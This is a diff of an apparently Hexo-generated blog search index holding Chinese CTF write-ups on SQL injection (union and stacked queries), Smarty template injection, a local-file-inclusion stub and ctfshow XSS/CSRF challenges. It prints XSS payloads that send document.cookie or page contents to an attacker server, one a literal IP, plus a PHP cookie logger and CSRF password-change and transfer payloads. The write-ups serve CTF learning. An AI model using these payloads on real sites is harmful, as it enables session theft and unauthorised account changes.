@@ -13,46 +13,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SQL注入笔记</title>
-    <url>/2022/03/31/blog0002-SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h2 id="零写在前面">零、写在前面</h2>
-<p>这一篇的学习讲解一些基本的注入原理主要结合<code>sqli-labs</code>的靶场，同时也会结合<code>sqlmap</code>的具体使用来说明。</p>
-<span id="more"></span>
-<h2 id="一报错注入">一、报错注入</h2>
-<p>当你在前端输入执行<code>sql</code>注入语句，后端执行之后，把错误信息返回给了前端，从而使你获取到了数据库的信息。</p>
-<h2 id="二联合注入">二、联合注入</h2>
-<h3 id="基本说明">1、基本说明</h3>
-<p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
-<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名<span class="number">-2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,&#123;column_name&#125;,<span class="number">0x5c</span>,&#123;colunm_name&#125;) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;);</span><br><span class="line"># 注意， 爆破内容时我们要考虑引号的问题</span><br><span class="line"># 补一个爆破内容的例子：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,id,<span class="number">0x5c</span>,name) <span class="keyword">from</span> whistle.user);</span><br></pre></td></tr></table></figure>
-<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
-<h3 id="补充">2、补充</h3>
-<p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
-<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
-<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
-<h2 id="二堆叠注入">二、堆叠注入</h2>
-<h3 id="说明">1、说明</h3>
-<p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
-<p>大致的原理和RCE中的管道运算符注入一样。</p>
-<h3 id="补充-1">2、补充</h3>
-<p>先上"随便注"的payload</p>
-<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
-<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>sql</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RCE中的绕过总结（持续更新中）</title>
     <url>/2021/09/14/blog0001-rce%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h2 id="一空格绕过">一、空格绕过</h2>
@@ -122,74 +82,64 @@
       </tags>
   </entry>
   <entry>
-    <title>ctfshow-xss-wp</title>
-    <url>/2021/11/23/blog0004-ctfshow-xss-wp/</url>
-    <content><![CDATA[<h2 id="一写在前面">一、写在前面</h2>
-<p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
-<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
-<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
+    <title>HCTF-warmup-目录穿越</title>
+    <url>/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
+    <content><![CDATA[<h2 id="一题目重点">一、题目重点</h2>
+<p>我们首先来看一下</p>
 <span id="more"></span>
-<p>反射型常见trick：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python for temporary site</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server &#123;port&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP for store the http request</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line">	<span class="comment">//var_dump(scandir(&quot;.&quot;));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span></span><br><span class="line"><span class="comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span></span><br><span class="line"><span class="comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试试(find / -name &quot;cookie.txt&quot;)</span></span><br></pre></td></tr></table></figure>
-<h2 id="反射型web316---web326">反射型（Web316 - Web326)</h2>
-<p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
-<p>不过会有各种过滤</p>
-<p>附上payload，一般都试试，如果过不去了可以试试其他banfa</p>
-<p>xss平台：https://xss.pt/</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先是经典的img</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.src = <span class="string">&quot;http://your-domain:port/&quot;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//location.href系列</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://your-domain:port/?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//iframe标签</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//input标签</span></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">    </span><br><span class="line">//svg标签</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">    </span><br><span class="line">//body标签</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">//img标签</span><br><span class="line">&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;</span><br><span class="line">&lt;img src=&#x27;x&#x27; onclick=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;</span><br></pre></td></tr></table></figure>
-<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
-<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
-<h2 id="存储型">存储型</h2>
-<h3 id="web327">web327</h3>
-<p>这题的难度并没有很大，主要是要理解向admin发送邮件，使得admin用户打开邮件，从而获取到admin用户的cookie值。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.open(&#x27;http://your-ip:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="web328">Web328</h3>
-<p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
-<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
-<p>顺利搞到管理员的cookie</p>
-<p>常见的body标签这次没成功，换了一个发现能打出来</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe	onload=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="web-329获取html内容">Web 329（获取HTML内容）</h3>
-<p>这题的方法和Web328是一样的，但是问题在于Cookie是有时效的，当Cookie被发送之后，则自动设置为无效了。类比一下现实情况，应该就是Cookie被设置了<code>HTTP-Only</code>，无法通过XSS获取到Cookie。</p>
-<p>但是参照上一题，我们可以知道flag值是存储在一个form里面的，因此我们可以利用Js直接读取HTML页面内容，直接让XSS返回我们的flag值。</p>
-<p>事实上我们在打的时候也不知道是具体flag值对应的下标，测试发现是1（其实应该也可以爆破</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;window.open(&#x27;http://121.5.227.123:2333/?cookie=&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="web330get-xss">web330（GET XSS）</h3>
-<p>这算是非常经典的题型了，但其实应该算是CSRF攻击，在各种比赛里都有这个的影子。</p>
-<p>简单来说，就是让管理员访问我们的恶意链接，由于没有csrf鉴权，因此可以直接利用连接修改密码。</p>
-<p>附上payload:</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;window.open(&#x27;http://127.0.0.1/api/change.php?p=123456&#x27;)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-<p>当然，由于之前的页面仍然存在，所以我们可以直接读取整个页面的内容，这样找到其中的flag，不过这应该算是非预期解。</p>
-<h3 id="web331post-xss">web331（POST XSS）</h3>
-<p>这道题的处理原理跟上一题是一样的理解，还是利用CSRF来实现admin用户的密码修改。</p>
-<p>这次的修改密码参数利用POST方法传参，这里我们可以利用XMLHttpRequest</p>
-<p>原型代码如下：</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> httpRequest = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    httpRequest.open(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://121.5.227.123/xss/cookie.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    httpRequest.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">    httpRequest.send(<span class="string">&#x27;p=1234567&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>转换成payload如下：</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;var httpRequest = new XMLHttpRequest();httpRequest.open(&#x27;POST&#x27;, &#x27;http://127.0.0.1/api/change.php&#x27;, true);httpRequest.setRequestHeader(&#x27;Content-type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);httpRequest.send(&#x27;p=123456&#x27;);&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-<p>当然也可以利用fetch来做：</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> res = fetch(<span class="string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="attr">body</span>: <span class="string">&#x27;p=12345678&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="web332转账xss">web332（转账XSS）</h3>
-<p>这道题在之前的极客大挑战也有出现过，还是CSRF的鉴权漏洞</p>
-<p>POST型XSS获取内容</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;var httpRequest = new XMLHttpRequest();httpRequest.open(&#x27;POST&#x27;, &#x27;http://127.0.0.1/api/amount.php&#x27;, true);httpRequest.setRequestHeader(&#x27;Content-type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);httpRequest.send(&#x27;u=user1&amp;a=10000&#x27;);&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
-<h3 id="web333">web333</h3>
-<p>同web331</p>
-<p>XSS篇章暂时结束</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片" /></p>
 ]]></content>
       <categories>
         <category>ctf</category>
         <category>web</category>
         <category>wp</category>
-        <category>xss</category>
+        <category>LFI</category>
       </categories>
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
-        <tag>ctfshow</tag>
-        <tag>xss</tag>
+        <tag>LFI</tag>
         <tag>wp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入笔记</title>
+    <url>/2022/03/31/blog0002-SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h2 id="零写在前面">零、写在前面</h2>
+<p>这一篇的学习讲解一些基本的注入原理主要结合<code>sqli-labs</code>的靶场，同时也会结合<code>sqlmap</code>的具体使用来说明。</p>
+<span id="more"></span>
+<h2 id="一报错注入">一、报错注入</h2>
+<p>当你在前端输入执行<code>sql</code>注入语句，后端执行之后，把错误信息返回给了前端，从而使你获取到了数据库的信息。</p>
+<h2 id="二联合注入">二、联合注入</h2>
+<h3 id="基本说明">1、基本说明</h3>
+<p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
+<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名<span class="number">-2</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;&#123;table_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,&#123;column_name&#125;,<span class="number">0x5c</span>,&#123;colunm_name&#125;) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;);</span><br><span class="line"># 注意， 爆破内容时我们要考虑引号的问题</span><br><span class="line"># 补一个爆破内容的例子：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,id,<span class="number">0x5c</span>,name) <span class="keyword">from</span> whistle.user);</span><br></pre></td></tr></table></figure>
+<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
+<h3 id="补充">2、补充</h3>
+<p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
+<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
+<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
+<h2 id="二堆叠注入">二、堆叠注入</h2>
+<h3 id="说明">1、说明</h3>
+<p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
+<p>大致的原理和RCE中的管道运算符注入一样。</p>
+<h3 id="补充-1">2、补充</h3>
+<p>先上"随便注"的payload</p>
+<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
+<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>web</category>
+        <category>sql</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql</tag>
       </tags>
   </entry>
   <entry>
@@ -260,9 +210,7 @@
 <p>可以注意到，这里在右上角获取到了我的IP地址，是一个跟后端交互的点，同时注意到这个网页使用的是smarty，基本可以考虑PHP的模板注入。</p>
 <p>首先我们尝试获取相关信息</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;<span class="variable">$smarty</span>.version&#125;	<span class="comment">//获取版本信息</span></span><br></pre></td></tr></table></figure>
-<figure>
-<img src="C:\Users\chendher\AppData\Roaming\Typora\typora-user-images\image-20220405202653660.png" alt="image-20220405202653660" /><figcaption aria-hidden="true">image-20220405202653660</figcaption>
-</figure>
+<p><img src="C:\Users\chendher\AppData\Roaming\Typora\typora-user-images\image-20220405202653660.png" alt="image-20220405202653660" /></p>
 <p>得到了smarty的版本为3+，在3以上版本的smarty禁止了<code>&#123;php&#125;&#123;/php&#125;</code>标签。</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125;</span><br></pre></td></tr></table></figure>
 <p>不过我们可以使用其他的标签（这里说起来感觉和XSS有点接近，毕竟都是涉及到Web画面渲染）。</p>
@@ -328,107 +276,74 @@
       </tags>
   </entry>
   <entry>
-    <title>HCTF-warmup-目录穿越</title>
-    <url>/2022/01/16/blog0005-HCTF-warmup-%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/</url>
-    <content><![CDATA[<h2 id="一题目重点">一、题目重点</h2>
-<p>我们首先来看一下</p>
+    <title>ctfshow-xss-wp</title>
+    <url>/2021/11/23/blog0004-ctfshow-xss-wp/</url>
+    <content><![CDATA[<h2 id="一写在前面">一、写在前面</h2>
+<p>之前一直在比赛遇到xss的题目，决定开始认真练习一下。</p>
+<p>web这块不练习的话还是不太理解其中的trick（其实还是基础不扎实，只看理论知识的话一上手就懵逼</p>
+<p>网上很多wp都是利用xss平台现成的payload和解析，这篇博客主要是用自己的VPS服务器打（也带了一些新手的探索吧。</p>
 <span id="more"></span>
-<figure>
-<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/wp/LFIHCTF-LFI-wp.png" alt="题目图片" /><figcaption aria-hidden="true">题目图片</figcaption>
-</figure>
+<p>反射型常见trick：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python for temporary site</span></span><br><span class="line">python3 <span class="literal">-m</span> http.server &#123;port&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#PHP for store the http request</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$log</span> = fopen(<span class="string">&quot;cookie.txt&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">	fwrite(<span class="variable">$log</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]);</span><br><span class="line">	fclose(<span class="variable">$log</span>);</span><br><span class="line">	<span class="comment">//var_dump(scandir(&quot;.&quot;));</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#来自一个刚刚接触服务器PHP的菜鸟碎碎念</span></span><br><span class="line"><span class="comment">#如果你没有在linux下开放写权限，PHP是无法打开上述相对路径的，fopen()返回false。</span></span><br><span class="line"><span class="comment">#当然你可以尝试/tmp/cookie.txt这样的绝对路径,但是没有开放权限的基础上，PHP会写入apache的一个临时目录下的/tmp/cookie.txt(试试(find / -name &quot;cookie.txt&quot;)</span></span><br></pre></td></tr></table></figure>
+<h2 id="反射型web316---web326">反射型（Web316 - Web326)</h2>
+<p>反射型的XSS，一般就是打到cookie从而获取登录权限。</p>
+<p>不过会有各种过滤</p>
+<p>附上payload，一般都试试，如果过不去了可以试试其他banfa</p>
+<p>xss平台：https://xss.pt/</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先是经典的img</span></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">	img.src = <span class="string">&quot;http://your-domain:port/&quot;</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//location.href系列</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.open(<span class="string">&#x27;http://your-domain:port/?cookie=&#x27;</span>+<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.location.href=<span class="string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://your-domain:port/?cookie=&quot;</span>+<span class="built_in">document</span>.cookie</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//iframe标签</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//input标签</span></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://your:domain/?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">    </span><br><span class="line">//svg标签</span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line">    </span><br><span class="line">//body标签</span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">//img标签</span><br><span class="line">&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;</span><br><span class="line">&lt;img src=&#x27;x&#x27; onclick=&#x27;alert(&#x27;yeah!&#x27;)&#x27;&gt;</span><br></pre></td></tr></table></figure>
+<p>xss平台上还有关于暗网的XSS，实体编码等等的手段，以后实际用到的时候再回来补充。</p>
+<p>对于反射型xss，反手就是一个HTTP Only，这样就不好打了。</p>
+<h2 id="存储型">存储型</h2>
+<h3 id="web327">web327</h3>
+<p>这题的难度并没有很大，主要是要理解向admin发送邮件，使得admin用户打开邮件，从而获取到admin用户的cookie值。</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;body onload=<span class="string">&quot;window.open(&#x27;http://your-ip:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="web328">Web328</h3>
+<p>这题没什么难点，其实就是之前的反射型多了一步利用cookie绕过验证</p>
+<p>进入用户管理页面，发现一个被隐藏的用户信息页面，因此我们直接把XSS打进去（我这里打的是用户名</p>
+<p>顺利搞到管理员的cookie</p>
+<p>常见的body标签这次没成功，换了一个发现能打出来</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe	onload=<span class="string">&quot;window.open(&#x27;http://your-domain:port/?cookie=&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="web-329获取html内容">Web 329（获取HTML内容）</h3>
+<p>这题的方法和Web328是一样的，但是问题在于Cookie是有时效的，当Cookie被发送之后，则自动设置为无效了。类比一下现实情况，应该就是Cookie被设置了<code>HTTP-Only</code>，无法通过XSS获取到Cookie。</p>
+<p>但是参照上一题，我们可以知道flag值是存储在一个form里面的，因此我们可以利用Js直接读取HTML页面内容，直接让XSS返回我们的flag值。</p>
